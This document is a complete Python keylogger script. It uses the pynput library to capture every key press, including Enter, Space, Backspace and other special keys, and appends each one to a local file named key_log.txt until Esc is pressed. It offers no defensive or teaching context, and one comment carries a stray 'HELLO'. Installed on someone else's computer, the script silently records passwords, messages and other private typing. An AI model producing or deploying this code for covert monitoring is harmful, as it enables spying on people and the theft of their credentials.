from pynput.keyboard import Key, Listener

# File to save logged keys
log_file = "key_log.txt"

# Function to log key pressesHELLO
def on_press(key):
    try:
        with open(log_file, "a") as file:
            # Log alphanumeric keys
            file.write(f"{key.char}\n")  # Add a newline after each key
    except AttributeError:
        with open(log_file, "a") as file:
            if key == Key.enter:  # Handle Enter key explicitly
                file.write("[ENTER]\n")
            elif key == Key.space:  # Handle Space key explicitly
                file.write("[SPACE]\n")
            elif key == Key.backspace:  # Handle Backspace key explicitly
                file.write("[BACKSPACE]\n")
            else:
                file.write(f"[{key}]\n")  # Log other special keys

# Function to stop logging (optional: use a specific key to stop)
def on_release(key):
    if key == Key.esc:  # Stop on pressing the 'Esc' key
        return False

# Start listening to the keyboard
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
